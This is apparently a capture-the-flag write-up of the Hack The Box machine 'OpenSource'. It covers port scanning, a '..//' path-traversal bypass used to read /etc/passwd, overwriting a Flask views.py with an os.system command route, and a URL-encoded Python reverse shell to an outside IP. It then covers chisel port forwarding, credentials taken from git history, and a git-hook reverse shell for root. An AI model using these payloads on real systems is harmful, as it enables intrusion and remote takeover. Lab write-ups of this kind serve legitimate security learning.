# OPENSOURCE
### User flag

As always nmap tcp port scan

```shell
$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oN allports 10.10.11.164 -oN allports
PORT     STATE    SERVICE REASON
22/tcp   open     ssh     syn-ack ttl 63
80/tcp   open     http    syn-ack ttl 62
3000/tcp filtered ppp     no-response
```

Then I visited the website played with the upload files subdomain and found some errors that indicated that the flask application was in debug mode, so to make sure I fuzzed the visited and found what I expected.

```shell
$ ffuf -w ~/wordlist/directory-list-2.3-big.txt:FUZZ -u http://10.10.11.164/FUZZ -v -o fuzzdir

[Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 124ms]
| URL | http://10.10.11.164/download
    * FUZZ: download

[Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 48ms]
| URL | http://10.10.11.164/console
    * FUZZ: console

```

The console was protected by a pin so I did some research to see if there was anyway to crack it and found [this] (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug). I needed someway to get a LFI to hack the console.
Eventually by reading the source code I found some protection against *../* but not against *..//* in utils.py

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```
So via BurpSuite I changed the name of the file to ..//..//..//..//etc/passwd and I was able to download the file

```
GET /uploads/..//..//..//..//etc/passwd HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1
```

 Next I tried cracking into the console but I came to the conclusion it was a rabbit hole since it was impossible for me to crack the PIN. However I thought that if I could manipulate the GET request I could also do it with the POST request and change the python code. So I added a bit of code to views.py

```python
@app.route('/dasor')
def rce():
    return os.system(request.args.get('cmd'))
```

And uploaded it with a POST requests

```
POST /upcloud HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12202201532330092291110617912
Content-Length: 1008
Origin: http://10.10.11.164
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1

-----------------------------12202201532330092291110617912
Content-Disposition: form-data; name="file"; filename="..//app/app/views.py"
Content-Type: text/x-python
...
```

Then I went to the domain I had just created and started a reverse shell

```
http://10.10.11.164/dasor?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.0.1%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

But I was not a user on the system I was root but ... in a container. At that point I remebered that port number 3000 so I tried to use chisel for port forwarding. Also I had to compile it staticly to use it in the container. I uploaded the binary through the page and fowarded the port

```shell
#on kali
$ chisel server -p 7777 --reverse
#on victim
$ ./chisel client 10.10.14.74:7777 R:3000:172.17.0.1:3000
```

The port contained gitea with a user called dev01 I found his credentials on the .git folder that comes with the source code on the brach dev. Once we login we find his ssh key so I copied it to my machine and logged via ssh.

### Root flag

As always I used linepeas but this time it did not found anything critical. I realised that the user had a git directory in his home but I did not found any clue until I tiped git log once again and saw another new commit. Was someone else on the machine or was it automatic?. To clear that doubt I uploaded and used pspy64 and found out every minute a commit was made.

Firstly I checked on crontab but it was empty so I did some research and found you can schedule git commands inside the .git/hooks so I looked inside and found a lot of files and added a reverse shell to one of them, one minute later I was root.

I later found out that you were supposed to go into the folder by yourself and delete the .sample that the files had since with the .sample they do not get executed. However in my instance someone already did it.
